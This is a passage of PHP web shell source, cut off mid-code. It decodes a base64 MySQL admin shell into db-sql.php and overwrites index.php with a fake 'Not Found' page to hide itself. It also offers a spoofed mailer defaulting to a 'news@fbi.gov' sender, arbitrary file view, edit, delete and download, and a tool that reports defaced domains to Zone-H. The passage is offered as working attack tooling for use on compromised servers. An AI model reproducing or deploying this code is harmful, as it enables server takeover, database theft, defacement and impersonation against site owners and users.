bGUgKCRyb3cgPSBteXNxbF9mZXRjaF9hcnJheSgkcm93cywgTVlTUUxfTlVNKSkNCgl7DQoJCSR0YWJsZWR1bXAgPSAiSU5TRVJUIElOVE8gJHRhYmxlIFZBTFVFUygiOw0KCQkkZmllbGRjb3VudGVyID0gLTE7DQoJCSRmaXJzdGZpZWxkID0gMTsNCgkJLy8gZ2V0IGVhY2ggZmllbGQncyBkYXRhDQoJCXdoaWxlICgrKyRmaWVsZGNvdW50ZXIgPCAkbnVtZmllbGRzKQ0KCQl7DQoJCQlpZiAoISRmaXJzdGZpZWxkKQ0KCQkJew0KCQkJCSR0YWJsZWR1bXAgLj0gJywgJzsNCgkJCX0NCgkJCWVsc2UNCgkJCXsNCgkJCQkkZmlyc3RmaWVsZCA9IDA7DQoJCQl9DQoJCQlpZiAoIWlzc2V0KCRyb3dbIiRmaWVsZGNvdW50ZXIiXSkpDQoJCQl7DQoJCQkJJHRhYmxlZHVtcCAuPSAnTlVMTCc7DQoJCQl9DQoJCQllbHNlDQoJCQl7DQoJCQkJJHRhYmxlZHVtcCAuPSAiJyIgLiBteXNxbF9lc2NhcGVfc3RyaW5nKCRyb3dbIiRmaWVsZGNvdW50ZXIiXSkgLiAiJyI7DQoJCQl9DQoJCX0NCgkJJHRhYmxlZHVtcCAuPSAiKTtcbiI7DQoJCWVjaG8gJHRhYmxlZHVtcDsNCgl9DQoJQG15c3FsX2ZyZWVfcmVzdWx0KCRyb3dzKTsNCn0NCg0KZnVuY3Rpb24gZHVtcCgpIHsNCglnbG9iYWwgJG15c3FsSGFuZGxlLCAkYWN0aW9uLCAkZGJuYW1lLCAkdGFibGVuYW1lOw0KCWlmKCAkYWN0aW9uID09ICJkdW1wVGFibGUiICl7DQoJCWhlYWRlcigiQ29udGVudC1kaXNwb3NpdGlvbjogZmlsZW5hbWU9JHRhYmxlbmFtZS5zcWwiKTsNCgkJaGVhZGVyKCdDb250ZW50LXR5cGU6IHVua25vd24vdW5rbm93bicpOw0KCQlmZXRjaF90YWJsZV9kdW1wX3NxbCgkdGFibGVuYW1lKTsNCgkJZWNobyAiXG5cblxuIjsNCgkJZWNobyAiXHJcblxyXG5cclxuIyMjICR0YWJsZW5hbWUgVEFCTEUgRFVNUCBDT01QTEVURUQgIyMjIjsNCgkJZXhpdDsNCgl9ZWxzZXsNCgkJaGVhZGVyKCJDb250ZW50LWRpc3Bvc2l0aW9uOiBmaWxlbmFtZT0kZGJuYW1lLnNxbCIpOw0KCQloZWFkZXIoJ0NvbnRlbnQtdHlwZTogdW5rbm93bi91bmtub3duJyk7DQoJCW15c3FsX3NlbGVjdF9kYiggJGRibmFtZSwgJG15c3FsSGFuZGxlICk7DQoJCSRxdWVyeV9pZCA9IG15c3FsX3F1ZXJ5KCJTSE9XIHRhYmxlcyIsJG15c3FsSGFuZGxlKTsNCgkJd2hpbGUgKCRyb3cgPSBteXNxbF9mZXRjaF9hcnJheSgkcXVlcnlfaWQsIE1ZU1FMX05VTSkpDQoJCXsNCgkJCQlmZXRjaF90YWJsZV9kdW1wX3NxbCgkcm93WzBdKTsNCgkJCQllY2hvICJcblxuXG4iOw0KCQkJCWVjaG8gIlxyXG5cclxuXHJcbiMjIyAkcm93WzBdIFRBQkxFIERVTVAgQ09NUExFVEVEICMjIyI7DQoJCQkJZWNobyAiXG5cblxuIjsNCgkJfQ0KCQllY2hvICJcclxuXHJcblxyXG4jIyMgJGRibmFtZSBEQVRBQkFTRSBEVU1QIENPTVBMRVRFRCAjIyMiOw0KCQlleGl0Ow0KCX0NCn0NCg0KZnVuY3Rpb24gdXRpbHMoKSB7DQoJZ2xvYmFsICRQSFBfU0VMRiwgJGNvbW1hbmQ7DQoJZWNobyAiPGgxPlV0aWxpdGllczwvaDE+XG4iOw0KCWlmKCAkY29tbWFuZCA9PSAiIiB8fCBzdWJzdHIoICRjb21tYW5kLCAwLCA1ICkgPT0gImZsdXNoIiApIHsNCgkJZWNobyAiPGhyPlxuIjsNCgkJZWNobyAiU2hvd1xuIjsNCgkJZWNobyAiPHVsPlxuIjsNCgkJZWNobyAiPGxpPjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249dXRpbHMmY29tbWFuZD1zaG93X3N0YXR1cyc+U3RhdHVzPC9hPlxuIjsNCgkJZWNobyAiPGxpPjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249dXRpbHMmY29tbWFuZD1zaG93X3ZhcmlhYmxlcyc+VmFyaWFibGVzPC9hPlxuIjsNCgkJZWNobyAiPGxpPjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249dXRpbHMmY29tbWFuZD1zaG93X3Byb2Nlc3NsaXN0Jz5Qcm9jZXNzbGlzdDwvYT5cbiI7DQoJCWVjaG8gIjwvdWw+XG4iOw0KCQllY2hvICJGbHVzaFxuIjsNCgkJZWNobyAiPHVsPlxuIjsNCgkJZWNobyAiPGxpPjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249dXRpbHMmY29tbWFuZD1mbHVzaF9ob3N0cyc+SG9zdHM8L2E+XG4iOw0KCQlpZiggJGNvbW1hbmQgPT0gImZsdXNoX2hvc3RzIiApIHsNCgkJCWlmKCBteXNxbF9xdWVyeSggIkZsdXNoIGhvc3RzIiApICE9IGZhbHNlICkNCgkJCQllY2hvICItIFN1Y2Nlc3MiOw0KCQkJZWxzZQ0KCQkJCWVjaG8gIi0gRmFpbCI7DQoJCX0NCgkJZWNobyAiPGxpPjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249dXRpbHMmY29tbWFuZD1mbHVzaF9sb2dzJz5Mb2dzPC9hPlxuIjsNCgkJaWYoICRjb21tYW5kID09ICJmbHVzaF9sb2dzIiApIHsNCgkJCWlmKCBteXNxbF9xdWVyeSggIkZsdXNoIGxvZ3MiICkgIT0gZmFsc2UgKQ0KCQkJCWVjaG8gIi0gU3VjY2VzcyI7DQoJCQllbHNlDQoJCQkJZWNobyAiLSBGYWlsIjsNCgkJfQ0KCQllY2hvICI8bGk+PGEgaHJlZj0nJFBIUF9TRUxGP2FjdGlvbj11dGlscyZjb21tYW5kPWZsdXNoX3ByaXZpbGVnZXMnPlByaXZpbGVnZXM8L2E+XG4iOw0KCQlpZiggJGNvbW1hbmQgPT0gImZsdXNoX3ByaXZpbGVnZXMiICkgew0KCQkJaWYoIG15c3FsX3F1ZXJ5KCAiRmx1c2ggcHJpdmlsZWdlcyIgKSAhPSBmYWxzZSApDQoJCQkJZWNobyAiLSBTdWNjZXNzIjsNCgkJCWVsc2UNCgkJCQllY2hvICItIEZhaWwiOw0KCQl9DQoJCWVjaG8gIjxsaT48YSBocmVmPSckUEhQX1NFTEY/YWN0aW9uPXV0aWxzJmNvbW1hbmQ9Zmx1c2hfdGFibGVzJz5UYWJsZXM8L2E+XG4iOw0KCQlpZiggJGNvbW1hbmQgPT0gImZsdXNoX3RhYmxlcyIgKSB7DQoJCQlpZiggbXlzcWxfcXVlcnkoICJGbHVzaCB0YWJsZXMiICkgIT0gZmFsc2UgKQ0KCQkJCWVjaG8gIi0gU3VjY2VzcyI7DQoJCQllbHNlDQoJCQkJZWNobyAiLSBGYWlsIjsNCgkJfQ0KCQllY2hvICI8bGk+PGEgaHJlZj0nJFBIUF9TRUxGP2FjdGlvbj11dGlscyZjb21tYW5kPWZsdXNoX3N0YXR1cyc+U3RhdHVzPC9hPlxuIjsNCgkJaWYoICRjb21tYW5kID09ICJmbHVzaF9zdGF0dXMiICkgew0KCQkJaWYoIG15c3FsX3F1ZXJ5KCAiRmx1c2ggc3RhdHVzIiApICE9IGZhbHNlICkNCgkJCQllY2hvICItIFN1Y2Nlc3MiOw0KCQkJZWxzZQ0KCQkJCWVjaG8gIi0gRmFpbCI7DQoJCX0NCgkJZWNobyAiPC91bD5cbiI7DQoJfSBlbHNlIHsNCgkJJHF1ZXJ5U3RyID0gZXJlZ19yZXBsYWNlKCAiXyIsICIgIiwgJGNvbW1hbmQgKTsNCgkJJHBSZXN1bHQgPSBteXNxbF9xdWVyeSggJHF1ZXJ5U3RyICk7DQoJCWlmKCAkcFJlc3VsdCA9PSBmYWxzZSApIHsNCgkJCWVjaG8gIkZhaWwiOw0KCQkJcmV0dXJuOw0KCQl9DQoJCSRjb2wgPSBteXNxbF9udW1fZmllbGRzKCAkcFJlc3VsdCApOw0KCQllY2hvICI8cCBjbGFzcz1sb2NhdGlvbj4kcXVlcnlTdHI8L3A+XG4iOw0KCQllY2hvICI8aHI+XG4iOw0KCQllY2hvICI8dGFibGUgY2VsbHNwYWNpbmc9MSBjZWxscGFkZGluZz0yIGJvcmRlcj0wPlxuIjsNCgkJZWNobyAiPHRyPlxuIjsNCgkJZm9yKCAkaSA9IDA7ICRpIDwgJGNvbDsgJGkrKyApIHsNCgkJCSRmaWVsZCA9IG15c3FsX2ZldGNoX2ZpZWxkKCAkcFJlc3VsdCwgJGkgKTsNCgkJCWVjaG8gIjx0aD4iLiRmaWVsZC0+bmFtZS4iPC90aD5cbiI7DQoJCX0NCgkJZWNobyAiPC90cj5cbiI7DQoJCXdoaWxlKCAxICkgew0KCQkJJHJvd0FycmF5ID0gbXlzcWxfZmV0Y2hfcm93KCAkcFJlc3VsdCApOw0KCQkJaWYoICRyb3dBcnJheSA9PSBmYWxzZSApIGJyZWFrOw0KCQkJZWNobyAiPHRyPlxuIjsNCgkJCWZvciggJGogPSAwOyAkaiA8ICRjb2w7ICRqKysgKQ0KCQkJCWVjaG8gIjx0ZD4iLmh0bWxzcGVjaWFsY2hhcnMoICRyb3dBcnJheVskal0gKS4iPC90ZD5cbiI7DQoJCQllY2hvICI8L3RyPlxuIjsNCgkJfQ0KCQllY2hvICI8L3RhYmxlPlxuIjsNCgl9DQp9DQpmdW5jdGlvbiBmb290ZXJfaHRtbCgpIHsNCglnbG9iYWwgJG15c3FsSGFuZGxlLCAkZGJuYW1lLCAkdGFibGVuYW1lLCAkUEhQX1NFTEYsICRVU0VSTkFNRTsNCgllY2hvICI8aHI+XG4iOw0KCWVjaG8gIjxzcGFuIGNsYXNzPVwibmV3XCI+WyRVU0VSTkFNRV08L3NwYW4+IC0gXG4iOw0KCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249YkdsemRFUkNjdz09Jz5EYXRhYmFzZSBMaXN0PC9hPiB8IFxuIjsNCglpZiggJHRhYmxlbmFtZSAhPSAiIiApDQoJCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249bGlzdFRhYmxlcyZkYm5hbWU9JGRibmFtZSZ0YWJsZW5hbWU9JHRhYmxlbmFtZSc+VGFibGUgTGlzdDwvYT4gfCAiOw0KCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249dXRpbHMnPlV0aWxzPC9hPiB8XG4iOw0KCWVjaG8gIjxhIGhyZWY9JyRQSFBfU0VMRj9hY3Rpb249bG9nb3V0Jz5Mb2dvdXQ8L2E+XG4iOw0KfQ0KLy8tLS0tLS0tLS0tLS0tIE1BSU4gLS0tLS0tLS0tLS0tLSAvLw0KZXJyb3JfcmVwb3J0aW5nKDApOw0KaW5pX3NldCAoJ2Rpc3BsYXlfZXJyb3JzJywgMCk7DQppbmlfc2V0ICgnbG9nX2Vycm9ycycsIDApOw0KaWYoICRhY3Rpb24gPT0gImxvZ29uIiB8fCAkYWN0aW9uID09ICIiIHx8ICRhY3Rpb24gPT0gImxvZ291dCIgKQ0KCWxvZ29uKCk7DQplbHNlIGlmKCAkYWN0aW9uID09ICJiRzluYjI1ZmMzVmliV2wwIiApDQoJbG9nb25fc3VibWl0KCk7DQplbHNlIGlmKCAkYWN0aW9uID09ICJkdW1wVGFibGUiIHx8ICRhY3Rpb24gPT0gImR1bXBEQiIgKSB7DQoJd2hpbGUoIGxpc3QoJHZhciwgJHZhbHVlKSA9IGVhY2goJEhUVFBfQ09PS0lFX1ZBUlMpICkgew0KCQlpZiggJHZhciA9PSAibXlzcWxfd2ViX2FkbWluX3VzZXJuYW1lIiApICRVU0VSTkFNRSA9ICR2YWx1ZTsNCgkJaWYoICR2YXIgPT0gIm15c3FsX3dlYl9hZG1pbl9wYXNzd29yZCIgKSAkUEFTU1dPUkQgPSAkdmFsdWU7DQoJCWlmKCAkdmFyID09ICJteXNxbF93ZWJfYWRtaW5faG9zdG5hbWUiICkgJEhPU1ROQU1FID0gJHZhbHVlOw0KCX0NCgkkbXlzcWxIYW5kbGUgPSBAbXlzcWxfY29ubmVjdCggJEhPU1ROQU1FLiI6MzMwNiIsICRVU0VSTkFNRSwgJFBBU1NXT1JEICk7DQoJZHVtcCgpOw0KfSBlbHNlIHsNCgl3aGlsZSggbGlzdCgkdmFyLCAkdmFsdWUpID0gZWFjaCgkSFRUUF9DT09LSUVfVkFSUykgKSB7DQoJCWlmKCAkdmFyID09ICJteXNxbF93ZWJfYWRtaW5fdXNlcm5hbWUiICkgJFVTRVJOQU1FID0gJHZhbHVlOw0KCQlpZiggJHZhciA9PSAibXlzcWxfd2ViX2FkbWluX3Bhc3N3b3JkIiApICRQQVNTV09SRCA9ICR2YWx1ZTsNCgkJaWYoICR2YXIgPT0gIm15c3FsX3dlYl9hZG1pbl9ob3N0bmFtZSIgKSAkSE9TVE5BTUUgPSAkdmFsdWU7DQoJfQ0KCWVjaG8gIjwhLS0iOw0KCSRteXNxbEhhbmRsZSA9IEBteXNxbF9jb25uZWN0KCAkSE9TVE5BTUUuIjozMzA2IiwgJFVTRVJOQU1FLCAkUEFTU1dPUkQgKTsNCgllY2hvICItLT4iOw0KCWlmKCAkbXlzcWxIYW5kbGUgPT0gZmFsc2UgKSB7DQoJCWVjaG8gIjx0YWJsZSB3aWR0aD0xMDAlIGhlaWdodD0xMDAlPjx0cj48dGQ+PGNlbnRlcj5cbiI7DQoJCWVjaG8gIjxoMT5Xcm9uZyBQYXNzd29yZCE8L2gxPlxuIjsNCgkJZWNobyAiPGEgaHJlZj0nJFBIUF9TRUxGP2FjdGlvbj1sb2dvbic+TG9nb248L2E+XG4iOw0KCQllY2hvICI8L2NlbnRlcj48L3RkPjwvdHI+PC90YWJsZT5cbiI7DQoJfSBlbHNlIHsNCgkJaWYoICRhY3Rpb24gPT0gImJHbHpkRVJDY3c9PSIgKQ0KCQkJbGlzdERhdGFiYXNlcygpOw0KCQllbHNlIGlmKCAkYWN0aW9uID09ICJjcmVhdGVEQiIgKQ0KCQkJY3JlYXRlRGF0YWJhc2UoKTsNCgkJZWxzZSBpZiggJGFjdGlvbiA9PSAiZHJvcERCIiApDQoJCQlkcm9wRGF0YWJhc2UoKTsNCgkJZWxzZSBpZiggJGFjdGlvbiA9PSAibGlzdFRhYmxlcyIgKQ0KCQkJbGlzdFRhYmxlcygpOw0KCQllbHNlIGlmKCAkYWN0aW9uID09ICJjcmVhdGVUYWJsZSIgKQ0KCQkJY3JlYXRlVGFibGUoKTsNCgkJZWxzZSBpZiggJGFjdGlvbiA9PSAiZHJvcFRhYmxlIiApDQoJCQlkcm9wVGFibGUoKTsNCgkJZWxzZSBpZiggJGFjdGlvbiA9PSAidmlld1NjaGVtYSIgKQ0KCQkJdmlld1NjaGVtYSgpOw0KCQllbHNlIGlmKCAkYWN0aW9uID09ICJxdWVyeSIgKQ0KCQkJdmlld0RhdGEoICRxdWVyeVN0ciApOw0KCQllbHNlIGlmKCAkYWN0aW9uID09ICJhZGRGaWVsZCIgKQ0KCQkJbWFuYWdlRmllbGQoICJhZGQiICk7DQoJCWVsc2UgaWYoICRhY3Rpb24gPT0gImFkZEZpZWxkX3N1Ym1pdCIgKQ0KCQkJbWFuYWdlRmllbGRfc3VibWl0KCAiYWRkIiApOw0KCQllbHNlIGlmKCAkYWN0aW9uID09ICJlZGl0RmllbGQiICkNCgkJCW1hbmFnZUZpZWxkKCAiZWRpdCIgKTsNCgkJZWxzZSBpZiggJGFjdGlvbiA9PSAiZWRpdEZpZWxkX3N1Ym1pdCIgKQ0KCQkJbWFuYWdlRmllbGRfc3VibWl0KCAiZWRpdCIgKTsNCgkJZWxzZSBpZiggJGFjdGlvbiA9PSAiZHJvcEZpZWxkIiApDQoJCQlkcm9wRmllbGQoKTsNCgkJZWxzZSBpZiggJGFjdGlvbiA9PSAiZG1sbGQwUmhkR0U9IiApDQoJCQl2aWV3RGF0YSggIiIgKTsNCgkJZWxzZSBpZiggJGFjdGlvbiA9PSAiYWRkRGF0YSIgKQ0KCQkJbWFuYWdlRGF0YSggImFkZCIgKTsNCgkJZWxzZSBpZiggJGFjdGlvbiA9PSAiYWRkRGF0YV9zdWJtaXQiICkNCgkJCW1hbmFnZURhdGFfc3VibWl0KCAiYWRkIiApOw0KCQllbHNlIGlmKCAkYWN0aW9uID09ICJlZGl0RGF0YSIgKQ0KCQkJbWFuYWdlRGF0YSggImVkaXQiICk7DQoJCWVsc2UgaWYoICRhY3Rpb24gPT0gImVkaXREYXRhX3N1Ym1pdCIgKQ0KCQkJbWFuYWdlRGF0YV9zdWJtaXQoICJlZGl0IiApOw0KCQllbHNlIGlmKCAkYWN0aW9uID09ICJkZWxldGVEYXRhIiApDQoJCQlkZWxldGVEYXRhKCk7DQoJCWVsc2UgaWYoICRhY3Rpb24gPT0gInV0aWxzIiApDQoJCQl1dGlscygpOw0KCQlteXNxbF9jbG9zZSggJG15c3FsSGFuZGxlKTsNCgkJZm9vdGVyX2h0bWwoKTsNCgl9DQp9DQo/Pg0KPGh0bWw+DQo8aGVhZD4NCjx0aXRsZT5NeVNRTCBJbnRlcmZhY2UgKERldmVsb3BlZCBCeSBNb2hhamVyMjIpPC90aXRsZT4NCjxib2R5IGJnQ29sb3I9IzAwMDAwMCA+DQo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPg0KPCEtLQ0KcC5sb2NhdGlvbiB7DQoJY29sb3I6ICMwMEZGMDA7DQp9DQpoMSwgaDIsIGgzIHsNCgljb2xvcjogIzAwRkYwMDsNCn0NCnRoIHsNCgliYWNrZ3JvdW5kLWNvbG9yOiAjMjIyMjIyOw0KCWNvbG9yOiAjMDBGRjAwOw0KCWZvbnQtc2l6ZTogc21hbGw7DQp9DQp0ZCB7DQoJY29sb3I6ICMwMEZGMDA7DQoJYmFja2dyb3VuZC1jb2xvcjogIzQ0NDQ0NDsNCglmb250LXNpemU6IHNtYWxsOw0KfQ0KZm9ybSB7DQoJbWFyZ2luLXRvcDogMDsNCgltYXJnaW4tYm90dG9tOiAwOw0KfQ0KYSB7DQoJdGV4dC1kZWNvcmF0aW9uOm5vbmU7DQoJY29sb3I6ICMwMEZGMDA7DQoJZm9udC1zaXplOnNtYWxsOw0KfQ0KQTpsaW5rIHsNCkNPTE9SOiNGRkZGRkY7DQpURVhULURFQ09SQVRJT046IG5vbmUNCn0NCkE6dmlzaXRlZCB7DQpDT0xPUjojMDBGRjAwOw0KVEVYVC1ERUNPUkFUSU9OOiBub25lDQp9DQpBOmFjdGl2ZSB7DQpDT0xPUjojMDBGRjAwOw0KVEVYVC1ERUNPUkFUSU9OOiBub25lDQp9DQpBOmhvdmVyIHsNCmNvbG9yOiMwMEZGMDA7DQpURVhULURFQ09SQVRJT046IG5vbmUNCn0NCmlucHV0LCBzZWxlY3QsIHRleHRhcmVhIHsNCmJhY2tncm91bmQtY29sb3I6ICMwMDAwMDA7DQpib3JkZXItc3R5bGU6IHNvbGlkOw0KZm9udC1mYW1pbHk6IFRhaG9tYSxWZXJkYW5hLEFyaWFsLFNhbnMtU2VyaWY7DQpmb250LXNpemU6c21hbGw7DQpjb2xvcjogIzAwRkYwMDsNCnBhZGRpbmc6IDBweDsNCn0NCmxpIHsNCmNvbG9yOiAjMDBGRjAwOw0KfQ0KLm5ldyB7DQpjb2xvcjogIzAwRkYwMDsNCn0NCi8vLS0+DQo8L3N0eWxlPg0KPC9oZWFkPg==';
        $file = fopen("db-sql.php" ,"w+");
        $write = fwrite ($file ,base64_decode($sqlshell));
        fclose($file);
        chmod("db-sql.php", 0644);
        $indexshell = fopen("index.php" ,"w+");
        $data = 'PGgxPk5vdCBGb3VuZDwvaDE+IA0KPHA+VGhlIHJlcXVlc3RlZCBVUkwgd2FzIG5vdCBmb3VuZCBvbiB0aGlzIHNlcnZlci48L3A+IA0KPGhyPiANCjxhZGRyZXNzPkFwYWNoZSBTZXJ2ZXIgYXQgPD89JF9TRVJWRVJbJ0hUVFBfSE9TVCddPz4gUG9ydCA4MDwvYWRkcmVzcz4gDQogICAgPHN0eWxlPiANCiAgICAgICAgaW5wdXQgeyBtYXJnaW46MDtiYWNrZ3JvdW5kLWNvbG9yOiNmZmY7Ym9yZGVyOjFweCBzb2xpZCAjZmZmOyB9IA0KICAgIDwvc3R5bGU+';
        $tulis = fwrite( $indexshell, base64_decode($data));
        fclose($indexshell);
        echo "<iframe src=mysql/db-sql.php width=97% height=100% frameborder=0></iframe>";
        }

        elseif(isset($_GET['x']) && ($_GET['x'] == 'mail')){
        if(isset($_POST['mail_send'])){
            $mail_to = $_POST['mail_to'];
            $mail_from = $_POST['mail_from'];
            $mail_subject = $_POST['mail_subject'];
            $mail_content = magicboom($_POST['mail_content']);
            if(@mail($mail_to,$mail_subject,$mail_content,"FROM:$mail_from")){
                $msg = "email sent to $mail_to";
            }
            else $msg = "send email failed";
        }
        ?>
        <form action="?y=<?php echo $pwd; ?>&amp;x=mail" method="post">
            <table class="cmdbox">
                <tr><td>
                        <textarea class="output" name="mail_content" id="cmd" style="height:340px;">Hey there, please patch me ASAP ;-p</textarea>
                <tr><td>&nbsp;<input class="inputz" style="width:20%;" type="text" value="admin@somesome.com" name="mail_to" />&nbsp; mail to</td></tr>
                <tr><td>&nbsp;<input class="inputz" style="width:20%;" type="text" value="news@fbi.gov" name="mail_from" />&nbsp; from</td></tr>
                <tr><td>&nbsp;<input class="inputz" style="width:20%;" type="text" value="patch me" name="mail_subject" />&nbsp; subject</td></tr>
                <tr><td>&nbsp;<input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="mail_send" /></td></tr></form>
        <tr><td>&nbsp;&nbsp;&nbsp;&nbsp;<?php echo $msg; ?></td></tr>
        </table>
    </form>

<?php }


elseif(isset($_GET['x']) && ($_GET['x'] == 'phpinfo')){
    @ob_start();
    @eval("phpinfo();");
    $buff = @ob_get_contents();
    @ob_end_clean();
    $awal = strpos($buff,"<body>")+6;
    $akhir = strpos($buff,"</body>");
    echo "<div class=\"phpinfo\">".substr($buff,$awal,$akhir-$awal)."</div>";
}
elseif(isset($_GET['view']) && ($_GET['view'] != "")){
    if(is_file($_GET['view'])){
        if(!isset($file)) $file = magicboom($_GET['view']);
        if(!$win && $posix){
            $name=@posix_getpwuid(@fileowner($folder));
            $group=@posix_getgrgid(@filegroup($folder));
            $owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];
        }
        else {
            $owner = $user;
        }
        $filn = basename($file);
        echo "<table style=\"margin:6px 0 0 2px;line-height:20px;\">
	<tr><td>Filename</td><td><span id=\"".clearspace($filn)."_link\">".$file."</span>
	<form action=\"?y=".$pwd."&amp;view=$file\" method=\"post\" id=\"".clearspace($filn)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\">
		<input type=\"hidden\" name=\"oldname\" value=\"".$filn."\" style=\"margin:0;padding:0;\" />
		<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$filn."\" />
		<input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" />
		<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('".clearspace($filn)."_link','".clearspace($filn)."_form');\" />
	</form>
	</td></tr>
	<tr><td>Size</td><td>".ukuran($file)."</td></tr>
	<tr><td>Permission</td><td>".get_perms($file)."</td></tr>
	<tr><td>Owner</td><td>".$owner."</td></tr>
	<tr><td>Create time</td><td>".date("d-M-Y H:i",@filectime($file))."</td></tr>
	<tr><td>Last modified</td><td>".date("d-M-Y H:i",@filemtime($file))."</td></tr>
	<tr><td>Last accessed</td><td>".date("d-M-Y H:i",@fileatime($file))."</td></tr>
	<tr><td>Actions</td><td><a href=\"?y=$pwd&amp;edit=$file\">edit</a> | <a href=\"javascript:tukar('".clearspace($filn)."_link','".clearspace($filn)."_form');\">rename</a> | <a href=\"?y=$pwd&amp;delete=$file\">delete</a> | <a href=\"?y=$pwd&amp;dl=$file\">download</a>&nbsp;(<a href=\"?y=$pwd&amp;dlgzip=$file\">gzip</a>)</td></tr>
	<tr><td>View</td><td><a href=\"?y=".$pwd."&amp;view=".$file."\">text</a> | <a href=\"?y=".$pwd."&amp;view=".$file."&amp;type=code\">code</a> | <a href=\"?y=".$pwd."&amp;view=".$file."&amp;type=image\">image</a></td></tr>
	</table>
	";
        if(isset($_GET['type']) && ($_GET['type']=='image')){
            echo "<div style=\"text-align:center;margin:8px;\"><img src=\"?y=".$pwd."&amp;img=".$filn."\"></div>";
        }
        elseif(isset($_GET['type']) && ($_GET['type']=='code')){
            echo "<div class=\"viewfile\">";
            $file = wordwrap(@file_get_contents($file),"240","\n");
            @highlight_string($file);
            echo "</div>";
        }
        else {
            echo "<div class=\"viewfile\">";
            echo nl2br(htmlentities((@file_get_contents($file))));
            echo "</div>";
        }
    }
    elseif(is_dir($_GET['view'])){
        echo showdir($pwd,$prompt);
    }

}
elseif(isset($_GET['edit']) && ($_GET['edit'] != "")){

    if(isset($_POST['save'])){
        $file = $_POST['saveas'];
        $content = magicboom($_POST['content']);
        if($filez = @fopen($file,"w")){
            $time = date("d-M-Y H:i",time());
            if(@fwrite($filez,$content)) $msg = "file saved <span class=\"gaya\">@</span> ".$time;
            else $msg = "failed to save";
            @fclose($filez);
        }
        else $msg = "permission denied";
    }
    if(!isset($file)) $file = $_GET['edit'];
    if($filez = @fopen($file,"r")){
        $content = "";
        while(!feof($filez)){
            $content .= htmlentities(str_replace("''","'",fgets($filez)));
        }
        @fclose($filez);
    }

    ?>
    <form action="?y=<?php echo $pwd; ?>&amp;edit=<?php echo $file; ?>" method="post">
        <table class="cmdbox">
            <tr><td colspan="2">
<textarea class="output" name="content">
<?php echo $content; ?>
</textarea>
            <tr><td colspan="2">Save as <input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="saveas" style="width:60%;" value="<?php echo $file; ?>" /><input class="inputzbut" type="submit" value="Save !" name="save" style="width:12%;" />
                    &nbsp;<?php echo $msg; ?></td></tr>
        </table>
    </form>
    <?php
}
elseif(isset($_GET['x']) && ($_GET['x'] == 'zhp'))
{
?>
    <form action="?y=<?php echo $pwd; ?>&amp;x=zhp" method="post">
<STYLE>
textarea{background-color:#105700;color:lime;font-weight:bold;font-size: 14px;font-family: Tahoma; border: 1px solid #000000;}
input{FONT-WEIGHT:normal;background-color: #105700;font-size: 10px;font-weight:bold;color: lime; font-family: Tahoma; border: 
1px solid #666666;height:20}
body {
font-family: Tahoma
}
tr {
BORDER: dashed 1px #333;
color: #FFF;
}
td {
BORDER: dashed 1px #333;
color: #FFF;
}
.table1 {
BORDER: 0px Black;

BACKGROUND-COLOR: Black;

color: #FFF;

}

.td1 {

BORDER: 0px;

BORDER-COLOR: #333333;

font: 7pt Verdana;

color: Green;

}

.tr1 {

BORDER: 0px;

BORDER-COLOR: #333333;

color: #FFF;

}

table {

BORDER: dashed 1px #333;

BORDER-COLOR: #333333;

BACKGROUND-COLOR: Black;

color: #FFF;

}


h1{

font-family:Tahoma;

color:yellow;

}

input {

border			: dashed 1px;

border-color		: #333;

BACKGROUND-COLOR: Black;

font: 10pt Verdana;

color: Red;

}

select {

BORDER-RIGHT:  Black 1px solid;

BORDER-TOP:    #DF0000 1px solid;

BORDER-LEFT:   #DF0000 1px solid;

BORDER-BOTTOM: Black 1px solid;

BORDER-color: #FFF;

BACKGROUND-COLOR: Black;

font: 8pt Verdana;

color: Red;

}

submit {

BORDER:  buttonhighlight 2px outset;

BACKGROUND-COLOR: Black;

width: 30%;

color: #FFF;

}

textarea {

border			: dashed 1px #333;

BACKGROUND-COLOR: Black;

font: Fixedsys bold;

color: #999;

}</style>
	
<center><b><h1>-[ Zone-H Notifier by Sid Gifari ]-</h1></b></font></center><br></br>
<p align='center'>
<font size='8' >Notifier :</font>
<input type='text' name='n' value='BD_LEVEL_7'/> 
<br><br>
<textarea cols='50' placeholder='Domains' rows='20' name='d'></textarea>
<br><br>
<input type='submit' name='s' value='Send'><br></p>
<?php
set_time_limit(0);
if(isset($_POST['s'])){
$noti = $_POST['n'];if($noti == ''){ echo "<br><br><center>Enter Notifier Name!<br><br>"; exit; }

$do = $_POST['d']; if($do == ''){ echo "<br><br><center>Enter Domains!<br><br>"; exit; }
$doma = explode("\r\n", $do);
$domains=count($doma);

for($i=0; $i<$domains; $i++){
$domain= ($doma[$i]);
$domain = str_replace(array("http://", "https://", "www."), "", trim($domain));
$domain = "http://" . $domain;


$hm=mt_rand(1,27);
$hm1=mt_rand(1,4);
$ch = curl_init();      
    ob_flush();
    flush(); 
curl_setopt($ch, CURLOPT_URL, "http://www.zone-h.org/notify/single");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer={$noti}&domain1={$domain}&hackmode={$hm}&reason={$hm1}");
curl_setopt($ch, CURLOPT_USERAGENT, "Chrome/36.0.1985.125");
$data = curl_exec($ch);

if(eregi('You are banned. Probably because you spammed the onhold.', $data )){
echo "<p align='center' dir='ltr'><font face='Arial Black' size='2'>Failed =>ip have been banned, try from another server </font></p>";
exit;
}
if(eregi('OK', $data )){
